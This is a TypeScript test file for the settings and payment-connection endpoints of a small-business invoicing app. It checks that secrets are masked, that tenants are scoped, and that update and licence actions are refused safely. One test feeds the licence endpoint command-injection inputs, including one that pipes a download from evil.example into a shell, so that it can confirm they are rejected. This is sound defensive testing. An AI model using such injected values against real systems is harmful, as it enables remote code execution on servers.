import { afterAll, beforeAll, expect, test } from "bun:test";
import { auth } from "@sentrello/auth";
import { signUpAsOwner } from "@sentrello/auth/testing";
import { db, schema } from "@sentrello/db";
import { registerForTest } from "@sentrello/module-sdk";
import { eq } from "drizzle-orm";
import settings, { maskTaxId } from "./index";

const suffix = crypto.randomUUID().slice(0, 8);
const email = `settings-${suffix}@example.test`;
const app = registerForTest(settings);

let orgId: string;
let headers: Headers;

beforeAll(async () => {
  const signUp = await signUpAsOwner({
    email,
    password: "correct-horse-battery-staple",
    name: "Owner",
  });
  const cookie = signUp.headers.get("set-cookie");
  if (!cookie) throw new Error("sign-up returned no session cookie");
  headers = new Headers({ cookie, "content-type": "application/json" });

  const org = await auth.api.createOrganization({
    body: { name: `Settings ${suffix}`, slug: `settings-${suffix}` },
    headers,
  });
  if (!org) throw new Error("could not create organization");
  orgId = org.id;
  await auth.api.setActiveOrganization({
    body: { organizationId: orgId },
    headers,
  });
});

afterAll(async () => {
  await db
    .delete(schema.paymentAccounts)
    .where(eq(schema.paymentAccounts.organizationId, orgId));
  await db.delete(schema.member).where(eq(schema.member.organizationId, orgId));
  await db
    .delete(schema.organizations)
    .where(eq(schema.organizations.id, orgId));
  const [u] = await db
    .select({ id: schema.user.id })
    .from(schema.user)
    .where(eq(schema.user.email, email));
  if (u) {
    await db.delete(schema.session).where(eq(schema.session.userId, u.id));
    await db.delete(schema.account).where(eq(schema.account.userId, u.id));
    await db.delete(schema.user).where(eq(schema.user.id, u.id));
  }
});

async function read(): Promise<unknown> {
  const res = await app.request("http://localhost/api/settings", { headers });
  return res.json();
}

test("it reports whether a secret is set, never the secret", async () => {
  // A settings page that echoes an API key leaks one over a shoulder, into a
  // screenshot, or through a support request.
  process.env.STRIPE_SECRET_KEY = "sk_test_abcdef123456";
  process.env.STRIPE_WEBHOOK_SECRET = "whsec_supersecret";
  process.env.RESEND_API_KEY = "re_secret_value";
  try {
    const body = (await read()) as Record<string, unknown>;
    const serialised = JSON.stringify(body);

    expect(serialised).not.toContain("sk_test_abcdef123456");
    expect(serialised).not.toContain("whsec_supersecret");
    expect(serialised).not.toContain("re_secret_value");

    const payments = body.payments as {
      stripe: {
        configured: boolean;
        webhookConfigured: boolean;
        testMode: boolean;
      };
    };
    expect(payments.stripe.configured).toBe(true);
    expect(payments.stripe.webhookConfigured).toBe(true);
    expect(payments.stripe.testMode).toBe(true);
  } finally {
    process.env.STRIPE_SECRET_KEY = "";
    process.env.STRIPE_WEBHOOK_SECRET = "";
    process.env.RESEND_API_KEY = "";
  }
});

test("a half-configured Stripe is reported as half-configured", async () => {
  // Keys without a webhook is the state that charges cards and records
  // nothing, so it must not read as "set up".
  process.env.STRIPE_SECRET_KEY = "sk_live_something";
  process.env.STRIPE_WEBHOOK_SECRET = "";
  try {
    const body = (await read()) as {
      payments: {
        stripe: {
          configured: boolean;
          webhookConfigured: boolean;
          testMode: boolean;
        };
      };
    };
    expect(body.payments.stripe.configured).toBe(true);
    expect(body.payments.stripe.webhookConfigured).toBe(false);
    expect(body.payments.stripe.testMode).toBe(false);
  } finally {
    process.env.STRIPE_SECRET_KEY = "";
  }
});

test("the webhook addresses are the ones a provider needs", async () => {
  const body = (await read()) as {
    payments: {
      stripe: { invoiceWebhookUrl: string; shopWebhookUrl: string };
      paypal: { shopWebhookUrl: string };
    };
  };
  expect(body.payments.stripe.invoiceWebhookUrl).toContain(
    "/api/webhooks/stripe/invoices",
  );
  expect(body.payments.stripe.shopWebhookUrl).toContain(
    "/api/shop/webhook/stripe",
  );
  expect(body.payments.paypal.shopWebhookUrl).toContain(
    "/api/shop/webhook/paypal",
  );
});

test("renaming the business sticks", async () => {
  const res = await app.request("http://localhost/api/settings", {
    method: "PUT",
    headers,
    body: JSON.stringify({ name: "Northfield Joinery" }),
  });
  expect(res.status).toBe(200);

  const [org] = await db
    .select()
    .from(schema.organizations)
    .where(eq(schema.organizations.id, orgId));
  expect(org?.name).toBe("Northfield Joinery");
});

test("an empty or absurd name is refused", async () => {
  for (const name of ["", "   ", "x".repeat(200)]) {
    const res = await app.request("http://localhost/api/settings", {
      method: "PUT",
      headers,
      body: JSON.stringify({ name }),
    });
    expect(res.status).toBe(400);
  }
});

test("settings are not readable without a session", async () => {
  const res = await app.request("http://localhost/api/settings");
  expect(res.status).toBe(401);
});

/**
 * The business identity that appears on every document a customer receives.
 *
 * A name alone is not a valid invoice in the UK or the EU, and a business paid
 * by transfer whose invoices omit its bank details answers "where do I send
 * this?" on every one. These are stored so the portal footer can carry them.
 */
test("the business can record its address, tax number and payment details", async () => {
  const res = await app.request("http://localhost/api/settings", {
    method: "PUT",
    headers,
    body: JSON.stringify({
      name: "Wierzbicki Tiling",
      address: "Unit 4, Tanners Yard\nLeeds LS9 8AB",
      taxIdLabel: "VAT number",
      taxId: "GB 412 7749 02",
      paymentInstructions: "Bank transfer to 20-45-11, account 8842 3901.",
    }),
  });
  expect(res.status).toBe(200);

  const read = await app.request("http://localhost/api/settings", { headers });
  const body = (await read.json()) as {
    business: {
      address: string;
      taxId: string;
      taxIdLabel: string;
      paymentInstructions: string;
    };
  };
  expect(body.business.address).toContain("Tanners Yard");
  expect(body.business.taxIdLabel).toBe("VAT number");
  expect(body.business.paymentInstructions).toContain("20-45-11");

  /**
   * The tax number comes back masked, and stays stored.
   *
   * It is the one field here worth stealing on its own, so the screen is shown
   * the last four characters the way an SSN is shown anywhere else. The number
   * itself still reaches an invoice — that is rendered on the server.
   */
  expect(body.business.taxId).toBe(maskTaxId("GB 412 7749 02"));
  expect(body.business.taxId).not.toContain("412");
  expect(body.business.taxId.endsWith("9 02")).toBe(true);

  /**
   * And saving the form again does not wipe it.
   *
   * The screen can only send back what it was given, so a mask returned
   * unchanged has to mean "leave it" — or every edit to the address would
   * quietly delete the tax number.
   */
  const again = await app.request("http://localhost/api/settings", {
    method: "PUT",
    headers,
    body: JSON.stringify({
      name: "Wierzbicki Tiling",
      address: "Unit 5, Tanners Yard\nLeeds LS9 8AB",
      taxIdLabel: "VAT number",
      taxId: body.business.taxId,
      paymentInstructions: "Bank transfer to 20-45-11, account 8842 3901.",
    }),
  });
  expect(again.status).toBe(200);
  const [org] = await db
    .select({ taxId: schema.organizations.taxId })
    .from(schema.organizations)
    .where(eq(schema.organizations.id, orgId));
  expect(org?.taxId).toBe("GB 412 7749 02");
});

test("a short tax number is still not handed to the browser whole", () => {
  expect(maskTaxId("12345678")).toBe("\u2022\u2022\u2022\u20225678");
  expect(maskTaxId("")).toBe("");
  expect(maskTaxId(null)).toBe("");
  // Four characters or fewer have nothing left to hide behind.
  expect(maskTaxId("1234")).toBe("1234");
});

test("blanking a field clears it rather than storing an empty string", async () => {
  await app.request("http://localhost/api/settings", {
    method: "PUT",
    headers,
    body: JSON.stringify({ name: "Wierzbicki Tiling", address: "   " }),
  });
  const read = await app.request("http://localhost/api/settings", { headers });
  const body = (await read.json()) as { business: { address: string } };
  expect(body.business.address).toBe("");
});

test("an address longer than a document is refused", async () => {
  const res = await app.request("http://localhost/api/settings", {
    method: "PUT",
    headers,
    body: JSON.stringify({
      name: "Wierzbicki Tiling",
      address: "x".repeat(501),
    }),
  });
  expect(res.status).toBe(400);
  expect(((await res.json()) as { error: string }).error).toContain("address");
});

/**
 * Settings name the business and carry what appears on its invoices, so a
 * scoping slip here would show one business another's address and bank
 * details — and let it rename them.
 */
test("another organization's settings cannot be read or written", async () => {
  const theirs = `other-org-${crypto.randomUUID().slice(0, 8)}`;
  await db.insert(schema.organizations).values({
    id: theirs,
    name: "Their Secret Trading Name",
    slug: theirs,
    createdAt: new Date(),
    address: "Their Private Address",
  });

  const read = await app.request("http://localhost/api/settings", { headers });
  const body = await read.text();
  expect(body).not.toContain("Their Secret Trading Name");
  expect(body).not.toContain("Their Private Address");

  // Writing goes to the session's own organization, whatever is asked for.
  await app.request("http://localhost/api/settings", {
    method: "PUT",
    headers,
    body: JSON.stringify({ name: "Renamed", organizationId: theirs }),
  });
  const [untouched] = await db
    .select()
    .from(schema.organizations)
    .where(eq(schema.organizations.id, theirs));
  expect(untouched?.name).toBe("Their Secret Trading Name");

  await db
    .delete(schema.organizations)
    .where(eq(schema.organizations.id, theirs));
});

/**
 * The update button.
 *
 * The app cannot update itself — it lives in the container being replaced — so
 * these cover what it is allowed to do: report a version, and ask. The asking
 * is guarded harder than the reporting, because replacing the running version
 * is the most consequential button in the product.
 */
test("the update screen reports the running version", async () => {
  const res = await app.request("http://localhost/api/settings/updates", {
    headers,
  });
  expect(res.status).toBe(200);

  const body = (await res.json()) as {
    current: string;
    canApply: boolean;
    status: { state: string };
  };
  expect(body.current).toBeTruthy();
  // No agent in a test process, so the screen must not offer a dead button.
  expect(body.canApply).toBe(false);
  expect(body.status.state).toBe("idle");
});

test("an instance with no agent refuses rather than pretending", async () => {
  const res = await app.request("http://localhost/api/settings/updates", {
    method: "POST",
    headers,
    body: "{}",
  });
  // Either it could not reach the licence server, or there is no agent. Both
  // are honest refusals; what must never happen is a 202 that goes nowhere.
  expect([503, 409]).toContain(res.status);
  expect(res.status).not.toBe(202);
});

test("rollback refuses when there is nowhere to go back to", async () => {
  const res = await app.request("http://localhost/api/settings/rollback", {
    method: "POST",
    headers,
    body: "{}",
  });
  // No recorded previous version and no agent. Either refusal is honest; a 202
  // would be a promise to restart the business and then do nothing.
  expect(res.status).toBe(409);
  expect(res.status).not.toBe(202);
});

/**
 * Entering a licence key from the app. The value reaches a root command line
 * on the customer's own server, so what this endpoint refuses matters more
 * than what it accepts.
 */
test("a malformed licence key is refused before it is stored", async () => {
  for (const evil of [
    'SENT-AAAA-BBBB-CCCC-DDDD"; curl evil.example | sh',
    "SENT-AAAA-BBBB-CCCC-$(id)",
    "not-a-key",
    "",
  ]) {
    const res = await app.request("http://localhost/api/settings/license", {
      method: "POST",
      headers,
      body: JSON.stringify({ key: evil }),
    });
    expect(res.status).toBe(400);
  }
});

test("a key set on the server is not replaced from a browser", async () => {
  process.env.SENTRELLO_LICENSE_KEY = "SENT-AAAA-BBBB-CCCC-DDDD";
  const res = await app.request("http://localhost/api/settings/license", {
    method: "POST",
    headers,
    body: JSON.stringify({ key: "SENT-4QGE-M9EP-PRTX-ZGWY" }),
  });
  process.env.SENTRELLO_LICENSE_KEY = "";
  // The server is the more privileged of the two places a key can live.
  expect(res.status).toBe(409);
});

test("syncing without a licence key says so rather than pretending", async () => {
  const res = await app.request("http://localhost/api/settings/sync", {
    method: "POST",
    headers,
    body: "{}",
  });
  expect(res.status).toBe(409);
  expect(res.status).not.toBe(202);
});

/**
 * Connecting a card processor from a screen, not from a file on a server.
 *
 * The previous answer to "how do I take card payments for an invoice" was
 * three environment variables and a restart, which the owner of a small
 * business is never going to do. What has to hold: the secret goes in, never
 * comes back out, and nothing goes live until it has been proven.
 */
test("keys are stored sealed and never returned", async () => {
  const saved = await app.request(
    "http://localhost/api/payments/accounts/stripe/test",
    {
      method: "PUT",
      headers,
      body: JSON.stringify({
        publicKey: "pk_test_visible",
        secretKey: "sk_test_51ExampleSecretKey",
        webhookSecret: "whsec_example",
      }),
    },
  );
  expect(saved.status).toBe(200);
  const body = await saved.text();
  // Not in the reply, in any shape.
  expect(body).not.toContain("sk_test_51ExampleSecretKey");
  expect(body).not.toContain("whsec_example");
  // The publishable half is not a secret and is shown as it is.
  expect(body).toContain("pk_test_visible");

  const listed = await app.request("http://localhost/api/payments/accounts", {
    headers,
  });
  const shown = await listed.text();
  expect(shown).not.toContain("sk_test_51ExampleSecretKey");
  // Enough to recognise your own key, useless to anybody else.
  expect(shown).toContain("Key");

  // And what is written down is not the key itself.
  const [row] = await db
    .select()
    .from(schema.paymentAccounts)
    .where(eq(schema.paymentAccounts.organizationId, orgId));
  expect(row?.secretKey).not.toBe("sk_test_51ExampleSecretKey");
  expect(row?.secretKey?.length).toBeGreaterThan(0);
});

test("nothing goes live until the connection has been proven", async () => {
  const refused = await app.request(
    "http://localhost/api/payments/accounts/stripe/test/enable",
    { method: "POST", headers },
  );
  // An instance switched on with untested keys is one whose first real
  // customer meets an error at the moment they try to pay.
  expect(refused.status).toBe(409);
  expect(((await refused.json()) as { error: string }).error).toContain(
    "test the connection",
  );

  const [row] = await db
    .select()
    .from(schema.paymentAccounts)
    .where(eq(schema.paymentAccounts.organizationId, orgId));
  expect(row?.enabled).toBe(false);
});

test("changing the key throws away what the last test proved", async () => {
  // Whatever the previous test said, it was about a different key.
  await db
    .update(schema.paymentAccounts)
    .set({ lastTestOk: true, lastTestMessage: "connected as Acme" })
    .where(eq(schema.paymentAccounts.organizationId, orgId));

  await app.request("http://localhost/api/payments/accounts/stripe/test", {
    method: "PUT",
    headers,
    body: JSON.stringify({ secretKey: "sk_test_AnotherKeyEntirely" }),
  });

  const [row] = await db
    .select()
    .from(schema.paymentAccounts)
    .where(eq(schema.paymentAccounts.organizationId, orgId));
  expect(row?.lastTestOk).toBeNull();
  expect(row?.enabled).toBe(false);
});

/**
 * The environment fallback, which was silent and is not any more.
 *
 * Pro charges through `STRIPE_SECRET_KEY` when no connection is saved —
 * deliberately, so an instance taking payments yesterday keeps taking them
 * today. On 2026-09-05 that meant an instance had been charging cards into a
 * different company's Stripe account with nothing on any screen saying so.
 * Nobody had done anything wrong; there was nowhere to see it.
 */

test("the screen names the account an environment key belongs to", async () => {
  // A stand-in Stripe, so this exercises the real request path without one.
  const stripe = Bun.serve({
    port: 0,
    fetch: () =>
      Response.json({
        id: "acct_1KEGdrA9N7GcPpMP",
        business_profile: { name: "Some Other Company" },
      }),
  });
  const previousBase = process.env.STRIPE_API_BASE;
  const previousKey = process.env.STRIPE_SECRET_KEY;
  process.env.STRIPE_API_BASE = `http://localhost:${stripe.port}`;
  process.env.STRIPE_SECRET_KEY = "sk_test_51ExampleEnvironmentKeyABCD";

  try {
    const res = await app.request("http://localhost/api/payments/accounts", {
      headers,
    });
    const body = (await res.json()) as {
      environmentFallback: {
        account: string | null;
        hint: string;
        live: boolean;
      } | null;
    };
    // Naming the business is the whole point. "An environment variable is in
    // use" tells nobody whether it is the right one.
    expect(body.environmentFallback?.account).toBe("Some Other Company");
    expect(body.environmentFallback?.hint).toBe("ABCD");
    expect(body.environmentFallback?.live).toBe(false);
  } finally {
    stripe.stop(true);
    process.env.STRIPE_API_BASE = previousBase;
    process.env.STRIPE_SECRET_KEY = previousKey;
    process.env.STRIPE_API_BASE = previousBase;
    process.env.STRIPE_SECRET_KEY = previousKey;
  }
});

test("an enabled connection means there is nothing to warn about", async () => {
  const previousKey = process.env.STRIPE_SECRET_KEY;
  process.env.STRIPE_SECRET_KEY = "sk_test_51ExampleEnvironmentKeyABCD";
  await db
    .update(schema.paymentAccounts)
    .set({ enabled: true })
    .where(eq(schema.paymentAccounts.organizationId, orgId));

  try {
    const res = await app.request("http://localhost/api/payments/accounts", {
      headers,
    });
    const body = (await res.json()) as { environmentFallback: unknown };
    // The saved connection wins, so the environment is never read and the
    // warning would be a lie.
    expect(body.environmentFallback).toBeNull();
  } finally {
    await db
      .update(schema.paymentAccounts)
      .set({ enabled: false })
      .where(eq(schema.paymentAccounts.organizationId, orgId));
    process.env.STRIPE_SECRET_KEY = previousKey;
  }
});

test("no environment key means no warning", async () => {
  const previousKey = process.env.STRIPE_SECRET_KEY;
  process.env.STRIPE_SECRET_KEY = undefined;
  try {
    const res = await app.request("http://localhost/api/payments/accounts", {
      headers,
    });
    expect(
      ((await res.json()) as { environmentFallback: unknown })
        .environmentFallback,
    ).toBeNull();
  } finally {
    process.env.STRIPE_SECRET_KEY = previousKey;
  }
});
